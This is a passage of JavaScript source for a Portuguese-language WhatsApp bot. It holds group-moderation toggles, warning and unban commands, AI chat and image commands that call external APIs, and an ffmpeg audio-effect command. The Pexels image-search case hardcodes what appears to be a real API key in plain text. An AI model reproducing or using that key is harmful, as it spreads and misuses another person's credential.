┃ 🚫 AntiBan: ${status(gp.antiban)}
╠═━━━〔 📱 𝐌𝐈́𝐃𝐈𝐀 〕━━━═╣
┃ 🎵 AntiAudio: ${status(gp.antiaudio)}
┃ 🎥 AntiVideo: ${status(gp.antivideo)}
┃ 🖼️ AntiImg: ${status(gp.antiimg)}
┃ 📄 AntiDoc: ${status(gp.antidoc)}
┃ 🎭 AntiSticker: ${status(gp.antisticker)}
╠═━━━〔 👥 𝐌𝐄𝐌𝐁𝐑𝐎𝐒 〕━━━═╣
┃ 🇧🇷 AntiFake: ${status(gp.antifake)}
┃ 🚨 AntiRaid: ${status(gp.antiraid)}
┃ 🚪 AntiEntrar: ${status(gp.antientrar)}
┃ 🚶 AntiSair: ${status(gp.antisair)}
╠═━━━〔 ☠️ 𝐄𝐒𝐏𝐄𝐂𝐈𝐀𝐈𝐒 〕━━━═╣
┃ 👻 AntiInvisível: ${status(gp.antiinvisivel)}
┃ 📢 AntiTagAll: ${status(gp.antitagall)}
┃ 🏷️ AntiMention: ${status(gp.antimention)}
┃ 📵 AntiCall: ${status(gp.anticall)}
┃ 💬 AntiPV: ${status(gp.antipv)}
╚═━━━〔 ❤️‍🔥 𝐙𝐘𝐑𝐎𝐍-𝐀𝐈 〕━━━═╝
`);
}
break;

case 'antipv': {
if (!So_Dono) return reply(msg.SoDono || '❌ Apenas o dono.');

global.antipv = global.antipv || false;
global.antipv = !global.antipv;

reply(
global.antipv
? '✅ Anti-PV ativado.'
: '❌ Anti-PV desativado.'
);
}
break;

case 'anticall': {
if (!isGroup) return reply('❌ Apenas em grupos.');
if (!isGroupAdmins) return reply(msg.SoAdmin);

if (dataGp[0].anticall === undefined)
dataGp[0].anticall = false;

dataGp[0].anticall = !dataGp[0].anticall;

setGp(dataGp);

reply(
dataGp[0].anticall
? '✅ Anti-Call ativado.'
: '❌ Anti-Call desativado.'
);
}
break;

case 'antimention': {
if (!isGroup) return reply('❌ Apenas em grupos.');
if (!isGroupAdmins) return reply(msg.SoAdmin);

if (dataGp[0].antimention === undefined)
dataGp[0].antimention = false;

dataGp[0].antimention = !dataGp[0].antimention;

setGp(dataGp);

reply(
dataGp[0].antimention
? '✅ Anti-Mention ativado.'
: '❌ Anti-Mention desativado.'
);
}
break;

case 'antitagall': {
if (!isGroup) return reply('❌ Apenas em grupos.');
if (!isGroupAdmins) return reply(msg.SoAdmin);

if (dataGp[0].antitagall === undefined)
dataGp[0].antitagall = false;

dataGp[0].antitagall = !dataGp[0].antitagall;

setGp(dataGp);

reply(
dataGp[0].antitagall
? '✅ Anti-TagAll ativado.'
: '❌ Anti-TagAll desativado.'
);
}
break;

case 'antiinvisivel': {
if (!isGroup) return reply('❌ Apenas em grupos.');
if (!isGroupAdmins) return reply(msg.SoAdmin);

if (dataGp[0].antiinvisivel === undefined)
dataGp[0].antiinvisivel = false;

dataGp[0].antiinvisivel = !dataGp[0].antiinvisivel;

setGp(dataGp);

reply(
dataGp[0].antiinvisivel
? '✅ Anti-Invisível ativado.'
: '❌ Anti-Invisível desativado.'
);
}
break;

case 'antisair': {
if (!isGroup) return reply('❌ Apenas em grupos.');
if (!isGroupAdmins) return reply(msg.SoAdmin);

if (dataGp[0].antisair === undefined)
dataGp[0].antisair = false;

dataGp[0].antisair = !dataGp[0].antisair;

setGp(dataGp);

reply(
dataGp[0].antisair
? '✅ Anti-Sair ativado.'
: '❌ Anti-Sair desativado.'
);
}
break;

case 'antientrar': {
if (!isGroup) return reply('❌ Apenas em grupos.');
if (!isGroupAdmins) return reply(msg.SoAdmin);

if (dataGp[0].antientrar === undefined)
dataGp[0].antientrar = false;

dataGp[0].antientrar = !dataGp[0].antientrar;

setGp(dataGp);

reply(
dataGp[0].antientrar
? '✅ Anti-Entrar ativado.'
: '❌ Anti-Entrar desativado.'
);
}
break;

case 'antiraid': {
if (!isGroup) return reply('❌ Apenas em grupos.');
if (!isGroupAdmins) return reply(msg.SoAdmin);

if (dataGp[0].antiraid === undefined)
dataGp[0].antiraid = false;

dataGp[0].antiraid = !dataGp[0].antiraid;

setGp(dataGp);

reply(
dataGp[0].antiraid
? '✅ Anti-Raid ativado.'
: '❌ Anti-Raid desativado.'
);
}
break;

case 'antifake': {
if (!isGroup) return reply('❌ Apenas em grupos.');
if (!isGroupAdmins) return reply(msg.SoAdmin);

if (dataGp[0].antifake === undefined)
dataGp[0].antifake = false;

dataGp[0].antifake = !dataGp[0].antifake;

setGp(dataGp);

reply(
dataGp[0].antifake
? '✅ Anti-Fake ativado.'
: '❌ Anti-Fake desativado.'
);
}
break;

case 'antivideo': {
if (!isGroup) return reply('❌ Apenas em grupos.');
if (!isGroupAdmins) return reply(msg.SoAdmin);

if (dataGp[0].antivideo === undefined)
dataGp[0].antivideo = false;

dataGp[0].antivideo = !dataGp[0].antivideo;

setGp(dataGp);

reply(
dataGp[0].antivideo
? '✅ Anti-Vídeo ativado.'
: '❌ Anti-Vídeo desativado.'
);
}
break;

case 'antisticker': {
if (!isGroup) return reply('❌ Apenas em grupos.');
if (!isGroupAdmins) return reply(msg.SoAdmin);

if (dataGp[0].antisticker === undefined)
dataGp[0].antisticker = false;

dataGp[0].antisticker = !dataGp[0].antisticker;

setGp(dataGp);

reply(
dataGp[0].antisticker
? '✅ Anti-Sticker ativado.'
: '❌ Anti-Sticker desativado.'
);
}
break;

case 'antidoc': {
if (!isGroup) return reply('❌ Apenas em grupos.');
if (!isGroupAdmins) return reply(msg.SoAdmin);

if (dataGp[0].antidoc === undefined)
dataGp[0].antidoc = false;

dataGp[0].antidoc = !dataGp[0].antidoc;

setGp(dataGp);

reply(
dataGp[0].antidoc
? '✅ Anti-Documento ativado.'
: '❌ Anti-Documento desativado.'
);
}
break;

case 'antiaudio': {
if (!isGroup) return reply('❌ Apenas em grupos.');
if (!isGroupAdmins) return reply(msg.SoAdmin);

if (dataGp[0].antiaudio === undefined)
dataGp[0].antiaudio = false;

dataGp[0].antiaudio = !dataGp[0].antiaudio;

setGp(dataGp);

reply(
dataGp[0].antiaudio
? '✅ Anti-Áudio ativado.'
: '❌ Anti-Áudio desativado.'
);
}
break;

case 'antiimg': {
if (!isGroup) return reply('❌ Apenas em grupos.');
if (!isGroupAdmins) return reply(msg.SoAdmin);

if (dataGp[0].antiimg === undefined)
dataGp[0].antiimg = false;

dataGp[0].antiimg = !dataGp[0].antiimg;

setGp(dataGp);

reply(
dataGp[0].antiimg
? '✅ Anti-Imagem ativado.'
: '❌ Anti-Imagem desativado.'
);
}
break;

case 'unban': {
try {
if (!isGroup) return reply('❌ Apenas em grupos.');
if (!isGroupAdmins) return reply(msg.SoAdmin);
if (!isBotGroupAdmins) return reply('❌ O bot precisa ser admin.');

let numero = q.replace(/\D/g, '');

if (!numero) {
return reply(`❌ Digite o número para adicionar de volta.\nEx: ${prefix}unban 5511999999999`);
}

if (numero.length < 10) {
return reply('❌ Número inválido.');
}

let alvo = `${numero}@s.whatsapp.net`;

await conn.groupParticipantsUpdate(from, [alvo], 'add');

await conn.sendMessage(from, {
text: `✅ @${numero} foi desbanido/adicionado de volta ao grupo.`,
mentions: [alvo]
}, { quoted: info });

} catch (e) {
console.log('[UNBAN ERROR]', e);
reply('❌ Não consegui adicionar esse número. Talvez ele tenha privacidade ativada ou o número esteja errado.');
}
}
break;

case 'antiwarn': {
if (!isGroup) return reply('❌ Apenas em grupos.');
if (!isGroupAdmins) return reply(msg.SoAdmin);

if (dataGp[0].antiwarn === undefined)
dataGp[0].antiwarn = false;

dataGp[0].antiwarn = !dataGp[0].antiwarn;

setGp(dataGp);

reply(
dataGp[0].antiwarn
? '✅ Anti-Warn ativado.'
: '❌ Anti-Warn desativado.'
);
}
break;

case 'warn': {
if (isGroup && dataGp[0]?.antiwarn) {
return reply('🚫 O sistema de advertências está bloqueado neste grupo.');
}
if (!isGroup) return reply('❌ Apenas em grupos.');
if (!isGroupAdmins) return reply(msg.SoAdmin);

if (!dataGp[0].warnings) dataGp[0].warnings = {};

let alvo =
mentionedJid[0] ||
info?.message?.extendedTextMessage?.contextInfo?.participant;

if (!alvo) return reply(`❌ Marque ou responda alguém.\nEx: ${prefix}warn @user`);

alvo = jidNormalizedUser(alvo);

if (!dataGp[0].warnings[alvo]) dataGp[0].warnings[alvo] = 0;

dataGp[0].warnings[alvo] += 1;
setGp(dataGp);

const total = dataGp[0].warnings[alvo];

await conn.sendMessage(from, {
text: `⚠️ @${alvo.split('@')[0]} recebeu um aviso.\n📋 Avisos: ${total}/3`,
mentions: [alvo]
}, { quoted: info });

if (total >= 3) {
await conn.groupParticipantsUpdate(from, [alvo], 'remove').catch(() => {});
delete dataGp[0].warnings[alvo];
setGp(dataGp);
}
}
break;

case 'unwarn': {
if (!isGroup) return reply('❌ Apenas em grupos.');
if (!isGroupAdmins) return reply(msg.SoAdmin);

if (!dataGp[0].warnings) dataGp[0].warnings = {};

let alvo =
mentionedJid[0] ||
info?.message?.extendedTextMessage?.contextInfo?.participant;

if (!alvo) return reply(`❌ Marque ou responda alguém.\nEx: ${prefix}unwarn @user`);

alvo = jidNormalizedUser(alvo);

if (!dataGp[0].warnings[alvo]) {
return reply('❌ Esse usuário não tem avisos.');
}

dataGp[0].warnings[alvo] -= 1;

if (dataGp[0].warnings[alvo] <= 0) {
delete dataGp[0].warnings[alvo];
}

setGp(dataGp);

await conn.sendMessage(from, {
text: `♻️ Aviso removido de @${alvo.split('@')[0]}.`,
mentions: [alvo]
}, { quoted: info });
}
break;

case 'antiadm':
case 'antipromote':
case 'antidemote':
case 'antiban': {
if (!isGroup) return reply('❌ Apenas em grupos.');
if (!isGroupAdmins) return reply(msg.SoAdmin);

if (dataGp[0][command] === undefined)
dataGp[0][command] = false;

dataGp[0][command] = !dataGp[0][command];

setGp(dataGp);

reply(
dataGp[0][command]
? `✅ ${command} ativado.`
: `❌ ${command} desativado.`
);
}
break;

case 'warnings': {
if (!isGroup) return reply('❌ Apenas em grupos.');

if (!dataGp[0].warnings) dataGp[0].warnings = {};

let alvo =
mentionedJid[0] ||
info?.message?.extendedTextMessage?.contextInfo?.participant ||
sender;

alvo = jidNormalizedUser(alvo);

const total = dataGp[0].warnings[alvo] || 0;

await conn.sendMessage(from, {
text: `📋 @${alvo.split('@')[0]} possui ${total}/3 avisos.`,
mentions: [alvo]
}, { quoted: info });
}
break;

case 'antiflood': {
if (!isGroup) return reply('❌ Apenas em grupos.');
if (!isGroupAdmins) return reply(msg.SoAdmin);

if (dataGp[0].antiflood === undefined)
dataGp[0].antiflood = false;

dataGp[0].antiflood = !dataGp[0].antiflood;

setGp(dataGp);

reply(
dataGp[0].antiflood
? '✅ Anti-Flood ativado.'
: '❌ Anti-Flood desativado.'
);
}
break;

case 'antitrava': {
if (!isGroup) return reply('❌ Apenas em grupos.');
if (!isGroupAdmins) return reply(msg.SoAdmin);

if (dataGp[0].antitrava === undefined)
dataGp[0].antitrava = false;

dataGp[0].antitrava = !dataGp[0].antitrava;

setGp(dataGp);

reply(
dataGp[0].antitrava
? '✅ Anti-Trava ativado.'
: '❌ Anti-Trava desativado.'
);
}
break;

case 'antibot': {
if (!isGroup) return reply('❌ Apenas em grupos.');
if (!isGroupAdmins) return reply(msg.SoAdmin);

if (dataGp[0].antibot === undefined)
dataGp[0].antibot = false;

dataGp[0].antibot = !dataGp[0].antibot;

setGp(dataGp);

reply(
dataGp[0].antibot
? '✅ Anti-Bot ativado.'
: '❌ Anti-Bot desativado.'
);
}
break;

case 'antigroup': {
if (!isGroup) return reply('❌ Apenas em grupos.');
if (!isGroupAdmins) return reply(msg.SoAdmin);

if (dataGp[0].antigroup === undefined)
dataGp[0].antigroup = false;

dataGp[0].antigroup = !dataGp[0].antigroup;

setGp(dataGp);

reply(
dataGp[0].antigroup
? '✅ Anti-Group ativado.'
: '❌ Anti-Group desativado.'
);
}
break;

case 'antispam': {
if (!isGroup) return reply('❌ Apenas em grupos.');
if (!isGroupAdmins) return reply(msg.SoAdmin);

if (dataGp[0].antispam === undefined)
dataGp[0].antispam = false;

dataGp[0].antispam = !dataGp[0].antispam;

setGp(dataGp);

reply(
dataGp[0].antispam
? '✅ Anti-Spam ativado.'
: '❌ Anti-Spam desativado.'
);
}
break;

//COMANDOS DE IA

case 'Kyaraimg': {
try {
const quoted = info.message?.extendedTextMessage?.contextInfo?.quotedMessage;
const quotedInfo = info.message?.extendedTextMessage?.contextInfo;

if (!quoted) return reply('Responda a uma imagem com o prompt desejado.');
if (!q) return reply(`Forneça um prompt!\nExemplo: *${prefix + command} transforme em anime*`);

let mime = '';
if (quoted.imageMessage) mime = 'image';

if (!/image/.test(mime)) {
return reply('Responda a uma imagem com o prompt desejado.');
}

await conn.sendMessage(from, { react: { text: '⏳', key: info.key } });

const mediaMsg = {
key: {
remoteJid: from,
id: quotedInfo.stanzaId,
participant: quotedInfo.participant
},
message: quoted
};

const mediaBuffer = await downloadMediaMessage(
mediaMsg,
'buffer',
{},
{ logger: console }
);

const form = new FormData();
form.append('image', mediaBuffer, {
filename: 'image.jpg',
contentType: 'image/jpeg'
});
form.append('prompt', q);

const { data } = await axios.post(
'https://zone.api.br/api/v2/edit/deepai',
form,
{
headers: {
...form.getHeaders()
},
timeout: 120000
}
);

if (!data?.status || !data?.imagem) {
throw new Error(data?.message || 'API não retornou imagem.');
}

await conn.sendMessage(from, {
image: { url: data.imagem },
caption: `┏━━━━━━━━━━━━━━━┓
┃ 🖼️ *KYARA IMAGE AI*
┗━━━━━━━━━━━━━━━┛

✨ *Transformação concluída!*

📌 *Prompt:*
➜ ${q}

🤖 IA: Kyara-IMG 2.3
⚙️ Status: Finalizado
🚀 Powered By Kyara

━━━━━━━━━━━━━━━━━━
`
}, { quoted: selo });

await conn.sendMessage(from, { react: { text: '✅', key: info.key } });

} catch (e) {
console.error('[NANO2 ERROR]', e?.message || e);
await conn.sendMessage(from, { react: { text: '❌', key: info.key } });
reply(`_Erro ao processar a imagem:_ ${e?.message || 'Tente novamente.'}`);
}
break;
}

case 'nano': {
try {

const prompt = q || args.join(' ');
if (!prompt) return reply(`Forneça um prompt!\nEx: ${prefix + command} coloque um mini carro bugatti`);

const ctx = info?.message?.extendedTextMessage?.contextInfo;
const quotedMsg = ctx?.quotedMessage;

let imageMsg =
quotedMsg?.imageMessage ||
info?.message?.imageMessage;

if (!imageMsg) return reply('Responda a uma imagem com o prompt desejado.');

await conn.sendMessage(from, { react: { text: '⏳', key: info.key } });

const stream = await baileys.downloadContentFromMessage(imageMsg, 'image');
let mediaBuffer = Buffer.from([]);

for await (const chunk of stream) {
mediaBuffer = Buffer.concat([mediaBuffer, chunk]);
}

const form = new FormData();
form.append('image', mediaBuffer, {
filename: 'image.png',
contentType: 'image/png'
});
form.append('prompt', prompt);
form.append('output_format', 'png');

const { data } = await axios.post(
'https://zone.api.br/api/v2/nanolite?apikey=freekey',
form,
{
headers: form.getHeaders(),
maxBodyLength: Infinity,
maxContentLength: Infinity
}
);

if (data?.status && data?.imagem) {
await conn.sendMessage(from, {
image: { url: data.imagem },
caption:
`╔━᳀『 *NANO BANANA* 』═᳀
⌬ *Prompt:* ${data.prompt || prompt}
╚━═━═━═━═━═━═━═━═━═᳀`
}, { quoted: selo });

await conn.sendMessage(from, { react: { text: '👍', key: info.key } });
} else {
throw new Error('A API não retornou o resultado esperado.');
}

} catch (e) {
console.error('[NANO ERROR]', e?.message || e);
await conn.sendMessage(from, { react: { text: '💔', key: info.key } });
reply('_Erro ao processar a imagem pela API._');
}
}
break;

case 'coder': {
try {
if (!q) return reply(`💻 Exemplo:\n${prefix}coder cria uma case de ping`);

const modelos = [
'qwen/qwen3-coder:free',
'qwen/qwen3-coder-30b-a3b-instruct'
];

let resposta = null;
let modeloUsado = null;

for (const modelo of modelos) {
try {

const response = await axios.post(
'https://openrouter.ai/api/v1/chat/completions',
{
model: modelo,
messages: [
{
role: 'system',
content: 'Você é Kyara Coder, especialista em programação. Responda em português e gere códigos complexos, se alguém te mandar fazer uma case responda como uma ia altamente profissional que sabe exatamente oque está sendo pedido.'
},
{
role: 'user',
content: q
}
]
},
{
headers: {
Authorization: 'Bearer API_KEY_ROUTER',
'Content-Type': 'application/json'
}
}
);

resposta = response.data.choices[0].message.content;
modeloUsado = modelo;
break;

} catch (e) {
console.log(`[FALHOU] ${modelo}`, e.response?.data || e.message);
}
}

if (!resposta) return reply('❌ Todos os modelos estão indisponíveis no momento.');

await conn.sendMessage(from, {
text: `╔━᳀『 💻 KYARA CODER 』═᳀
┃ 🤖 Modelo: Kyara-AI 3.1
┃ 👤 Usuário: ${pushname}
╚━━━━━━━━━━━━━━
${resposta}`
}, { quoted: selo });

} catch (err) {
console.log('[ERRO CODER]', err.response?.data || err);
reply('❌ Erro ao consultar a IA.');
}
}
break;

case 'gemma':
case 'gema': {
try {
if (!q) return reply(`Exemplo: ${prefix + command} oi`);

await reply('🤖 Pensando...');

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

const modelos = [
  'google/gemma-4-31b-it:free',
  'google/gemma-4-26b-a4b-it:free'
];

let resposta = null;
let modeloUsado = null;

for (const modelo of modelos) {
  try {
    const response = await axios.post(
      'https://openrouter.ai/api/v1/chat/completions',
      {
        model: modelo,
        messages: [
          {
            role: 'system',
            content: 'Você é Gemma, especialista em programação. Você é sincera, calma e resolve todos os problemas dos usuários facilmente.'
          },
          {
            role: 'user',
            content: q
          }
        ]
      },
      {
        headers: {
          Authorization: `Bearer ${OPENROUTER_KEY}`,
          'Content-Type': 'application/json'
        }
      }
    );

    resposta = response.data?.choices?.[0]?.message?.content;
    modeloUsado = modelo;

    if (resposta) break;

  } catch (err) {

    console.log(`[FALHOU] ${modelo}`, err.response?.data || err.message);

    if (
      err.response?.status === 429 ||
      err.response?.data?.error?.code === 429
    ) {
      const retry =
        err.response?.data?.error?.metadata?.retry_after_seconds || 8;

      console.log(`[RATE LIMIT] Esperando ${retry}s para tentar o próximo modelo...`);
      await sleep(retry * 1000);
    }
  }
}

if (!resposta) {
  return reply(
`❌ Todos os modelos do Gemma falharam.

Tente novamente em alguns segundos.
Os modelos gratuitos do OpenRouter estão sobrecarregados.`
  );
}

reply(`🤖 *Modelo:* ${modeloUsado}

${resposta}`);

} catch (e) {
console.log('[ERRO IA]', e.response?.data || e.message);
reply('❌ Erro ao consultar a IA.');
}
}
break;

case 'kyaravideo':
case 'kyaraimg': {
try {
if (!q) return reply(`Exemplo:\n${prefix}img gato preto`);

// coloca sua key da Pexels aqui
const PEXELS_KEY = 'HZjVAE2I7eS0roph5boZfEBlFWG4ZFoXiyEYr6YsoXBrcOvtRPvcrze8';

await reply('🔎 Buscando...');

const pesquisa = encodeURIComponent(q);

const { data } = await axios.get(
  `https://api.pexels.com/v1/search?query=${pesquisa}&per_page=10&orientation=square`,
  {
    headers: {
      Authorization: PEXELS_KEY
    },
    timeout: 30000
  }
);

if (!data.photos || data.photos.length === 0) {
  return reply('❌ Nenhuma imagem encontrada.');
}

const foto = data.photos[Math.floor(Math.random() * data.photos.length)];
const imgUrl = foto.src.large2x || foto.src.large || foto.src.original;

const img = await axios.get(imgUrl, {
  responseType: 'arraybuffer',
  timeout: 30000,
  headers: {
    'User-Agent': 'Mozilla/5.0'
  }
});

await conn.sendMessage(from, {
  image: Buffer.from(img.data),
  caption: `🖼️ *Imagem encontrada*\n\n🔎 Pesquisa: ${q}\n📸 Foto por: ${foto.photographer}\n🌐 Fonte: Pexels`
}, { quoted: info });

} catch (e) {
console.log('ERRO KYARA:', e?.response?.status || e.message);

if (e?.response?.status === 401) return reply('❌ API key da Kyara inválida.');
if (e?.response?.status === 429) return reply('❌ Limite da Kyara atingido. Tenta mais tarde.');

reply('❌ Erro ao buscar imagem.');
}
}
break;

case 'modelosimg': {
try {
const OPENROUTER_KEY = 'API_KEY_ROUTER';

const res = await axios.get('https://openrouter.ai/api/v1/models', {
headers: {
Authorization: `Bearer ${OPENROUTER_KEY}`
}
});

const modelos = res.data.data
.filter(m => JSON.stringify(m).toLowerCase().includes('image'))
.map(m => m.id)
.slice(0, 30);

if (!modelos.length) return reply('❌ Nenhum modelo de imagem apareceu na sua OpenRouter.');

return reply(
`🖼️ Modelos com imagem encontrados:\n\n` +
modelos.map((m, i) => `${i + 1}. ${m}`).join('\n')
);

} catch (e) {
console.log(e?.response?.data || e.message);
reply('❌ Erro ao listar modelos.');
}
}
break;

case 'modelostodos': {
const res = await axios.get(
'https://openrouter.ai/api/v1/models',
{
headers: {
Authorization: `Bearer API_KEY_ROUTER`
}
}
);

reply(
res.data.data
.map(x => x.id)
.join('\n')
.slice(0, 3900)
);
}
break;

case "cardney":
case "neymarcard": {
try {

if (!q) return reply("🧾 Coloca um texto aí desgraça!");
if (q.length > 40) return reply("⚠️ Máx 40 caracteres!");

// 🎴 REAÇÃO
await reagir(from, "🎴");

// 🔗 API
let img = `http://node3.tedhost.com.br:3027/cardney?text=${encodeURIComponent(q)}`;

// 🎤 FRASES
const frases = [
"Desista dos seus sonhos",
"O segredo é não acreditar",
"Eu jogo por amor ao futebol, e mesmo assim erro",,
"nunca seja ousado sempre",
"A pressão não faz parte",
"Durma enquanto eles treinam",
"A consequência é vitória",
"Não confie no seu talento",
"Nem sempre seja humilde",
"Deus no comando",
"Se cair, levante mais fraco",
"O impossível é só um fato",
"Jogue com tristeza",
"A mente não é tudo",
"Se arrisque mais",
"O sucesso vem com sucesso",
"Faça história na sua mente",
"Sucesso vence persistência",
"Seja igual",
"O topo é o desafio",
"Acredite até o fim",
"Nada vem fácil",
"Seja sua pior versão",
"O foco é perder",
"Nunca, pare de evoluir",
"O jogo muda rápido",
"Dê o seu mínimo",
"Seja protagonista",
"A vida é, desafio",
"Manda o desgraçado do Kyara pagar meu salário esse fdp"
];

let frase = frases[Math.floor(Math.random() * frases.length)];

// 📥 BAIXAR IMAGEM (FORÇADO)
const buffer = await getBuffer(img);

if (!buffer || buffer.length < 1000) {
return reply("❌ Erro: API não retornou imagem válida");
}

// 📤 ENVIAR DIRETO (SEM BUG)
await conn.sendMessage(from, {
image: buffer,
caption: `🧾 *CARD DO CAICAI*\n\n"${q}"\n\n💬 ${frase}\n\n_${NomeBot} 🚀_`
}, { quoted: selo });

// ✅ FINAL
await reagir(from, "✅");

} catch (e) {
console.log("Erro cardney:", e);
await reagir(from, "❌");
reply("❌ Erro ao gerar card");
}
}
break;

case 'moeda':
case 'caraoucoroa': {
try {
await conn.sendMessage(from, { react: { text: '🪙', key: info.key } });

const { data } = await axios.get('https://zone.api.br/api/canvas/moeda');

if (!data?.status || !data?.result?.download) {
throw new Error('API falhou');
}

await conn.sendMessage(from, {
video: { url: data.result.download },
ptv: true,
mimetype: 'video/mp4'
}, { quoted: selo });

} catch (e) {
console.error('[ERRO MOEDA]', e?.response?.data || e.message);
reply('_Erro ao jogar a moeda._');
}
break;
}

case 'textcraft': {
try {
if (!q) return reply(`Exemplo: ${prefix + command} Mine/mine2/mine3`);

const [t1, t2, t3] = q.split('/');

const api = `https://zone.api.br/api/v1/canvas/minecrafttext?text=${encodeURIComponent(t1 || '')}&text2=${encodeURIComponent(t2 || '')}&text3=${encodeURIComponent(t3 || '')}`;

const { data } = await axios.get(api);

if (!data?.status || !data?.url) {
return reply('_Erro ao gerar textcraft._');
}

await conn.sendMessage(from, {
image: { url: data.url },
caption: '> _Kyara & Kyara-AI_'
}, { quoted: selo });

} catch (e) {
console.error('[ERRO TEXTCRAFT]', e?.response?.data || e.message);
reply('_Erro ao gerar textcraft._');
}
break;
}

case 'botinfo': {
reply(`🤖 *BOT INFO*

Nome: Kyara
Descrição: 
🤖 Kyara & Kyara-AI

O Kyara é um poderoso bot multifuncional para WhatsApp, desenvolvido pela Kyara, projetado para oferecer desempenho, segurança e praticidade em um único sistema.

Equipado com a tecnologia Kyara-AI, o bot é capaz de responder perguntas, auxiliar usuários, executar comandos administrativos, fornecer ferramentas de entretenimento, downloads, utilidades e diversas funções avançadas para grupos e uso privado.

🔥 Recursos Principais
• Inteligência Artificial integrada (Kyara-AI)
• Sistema rápido e otimizado
• Comandos administrativos completos
• Ferramentas para grupos e comunidades
• Downloads de mídias e conteúdos
• Sistema de informações e utilidades
• Segurança e estabilidade avançadas
• Atualizações constantes

🚀 Missão
Entregar uma experiência moderna, eficiente e inteligente para administradores, membros e comunidades do WhatsApp.

💻 Kyara
🏢 Empresa: Kyara
🌐 Site Oficial: https://

⚖️ © 2026 Kyara — Todos os direitos reservados.

Status: Online ✅
Plataforma: WhatsApp Bot
Sistema: Node.js
Versão: 2.4`)
}
break;

case 'criador': {
reply(`\`\`\`
╭━━━━━━〔 🔥 KYARA 🔥 〕━━━━━━╮

👑 Kyara
🤖 Projeto: Kyara
⚡ IA: Kyara-AI

🌐 Site Oficial:
https://

📞 Suporte Comercial:
https://wa.me/message/FO4NMGVGHVUCI1

© 2026 Todos os direitos reservados
® Kyara

╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
\`\`\``)
}
break;

case 'avaliar': {
if(!q) return reply(`⭐ Use: ${prefix}avaliar mensagem`)
reply(`⭐ *AVALIAÇÃO*

Mensagem: ${q}
Nota: ${Math.floor(Math.random() * 10)}/10`)
}
break;


case 'status': {
reply(`📊 *STATUS DO BOT*

🟢 Online
⚡ Funcionando normalmente
🛡️ Sistema estável
📡 Conexão ativa`)
}
break;

case 'uptime': {
const uptime = process.uptime()
const h = Math.floor(uptime / 3600)
const m = Math.floor((uptime % 3600) / 60)
const s = Math.floor(uptime % 60)

reply(`⏳ *UPTIME*

🕒 Ativo há:
${h}h ${m}m ${s}s`)
}
break;

case 'versao': {
reply(`📦 *VERSÃO DO SISTEMA*

KYARA
Versão: 2.4
Build: stable-release`)
}
break;

case '8d': {

const { downloadContentFromMessage } = require('@systemzero/baileys')

try {

// ========================
// PEGAR ÁUDIO
// ========================

const quoted = info?.message?.extendedTextMessage?.contextInfo?.quotedMessage

let audioMessage = null

if (quoted?.audioMessage) {
  audioMessage = quoted.audioMessage
}

// ========================
// SEM ÁUDIO
// ========================

if (!audioMessage) {
return reply(`╔══════════════════╗
║ 🎧 AUDIO VIP
╚══════════════════╝

❌ Responda um áudio.

📌 Exemplos:
${prefix}8d 1
${prefix}8d 2
${prefix}8d grave
${prefix}8d demonio
${prefix}8d robot
${prefix}8d nightcore`)
}

// ========================
// REAÇÃO
// ========================

await conn.sendMessage(from, {
react: { text: "🎧", key: info.key }
})

// ========================
// EFEITO
// ========================

const efeito = args[0]?.toLowerCase() || '1'

let filtro = ''
let nome = ''

switch (efeito) {

case '1':
nome = '🎧 8D LEVE'
filtro = 'apulsator=hz=0.08'
break

case '2':
nome = '🔥 8D FORTE'
filtro = 'apulsator=hz=0.12,volume=1.4'
break

case '3':
nome = '💀 8D EXTREMO'
filtro = 'apulsator=hz=0.15,bass=g=15'
break

case 'grave':
nome = '🔊 SUPER GRAVE'
filtro = 'bass=g=20'
break

case 'demonio':
nome = '👹 VOZ DEMÔNIO'
filtro = 'asetrate=44100*0.7,atempo=1.1'
break

case 'robot':
nome = '🤖 VOZ ROBÔ'
filtro = 'afftfilt=real=hypot(re\\,im):imag=0'
break

case 'nightcore':
nome = '⚡ NIGHTCORE'
filtro = 'asetrate=48000*1.25,atempo=1.1'
break

default:
nome = '🎧 8D PADRÃO'
filtro = 'apulsator=hz=0.08'

}

// ========================
// MSG PROCESSO
// ========================

await conn.sendMessage(from, {
text: `╔══════════════════╗
║ 👑 AUDIO VIP
╚══════════════════╝

${nome}

⏳ Processando áudio...`
}, { quoted: selo })

// ========================
// TEMP
// ========================

const tempDir = path.resolve("./temp")
if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir)

const id = Date.now()
const input = path.join(tempDir, `${id}.ogg`)
const output = path.join(tempDir, `${id}.mp3`)

// ========================
// BAIXAR ÁUDIO
// ========================

const stream = await downloadContentFromMessage(audioMessage, 'audio')

let buffer = Buffer.from([])
for await (const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])
}

fs.writeFileSync(input, buffer)

// ========================
// FFMPEG
// ========================

// 🔥 suporta Windows e Linux
const ffmpeg = fs.existsSync("./lib/ffmpeg.exe")
  ? "./lib/ffmpeg.exe"
  : "ffmpeg"

// ========================
// EXECUTAR
// ========================

const cmd = `"${ffmpeg}" -y -i "${input}" -af "${filtro}" "${output}"`

exec(cmd, async (err) => {

if (err) {
console.log(err)
return reply('❌ Erro ao aplicar efeito.')
}

try {

if (!fs.existsSync(output)) {
return reply('❌ Áudio não processado.')
}

// ========================
// ENVIAR
// ========================

await conn.sendMessage(from, {
audio: fs.readFileSync(output),
mimetype: 'audio/mpeg',
ptt: false
}, { quoted: selo })

// ========================
// FINAL
// ========================

await conn.sendMessage(from, {
text: `╔══════════════════╗
║ ✅ EFEITO APLICADO
╚══════════════════╝

${nome}

🔥 Áudio processado com sucesso.`
}, { quoted: selo })

// ========================
// LIMPAR
// ========================

if (fs.existsSync(input)) fs.unlinkSync(input)
if (fs.existsSync(output)) fs.unlinkSync(output)

// ========================
// REAÇÃO FINAL
// ========================

await conn.sendMessage(from, {
react: { text: "✅", key: info.key }
})

} catch (e) {
console.log(e)
}

})

} catch (err) {
console.log(err)
reply('❌ Erro no comando 8d.')
}

}
break;

case 'pin':
case 'pinterest': {
try {

if (!q) return reply(`Uso: ${prefix}${command} <termo> [qtd]\nEx: ${prefix}${command} gato 6`);

const args = q.trim().split(/\s+/);

let limit = 6;
if (/^\d+$/.test(args[args.length - 1])) {
    limit = Math.max(1, Math.min(10, parseInt(args.pop(), 10)));
}

const query = args.join("");

// 🔎 REAÇÃO
await reagir(from, "🔎");

// 📡 API

const { data } = await axios.get(
    `${sysite}/api/pinterest`,
    {
        params: { q: query, limit: 50 },
        timeout: 120000
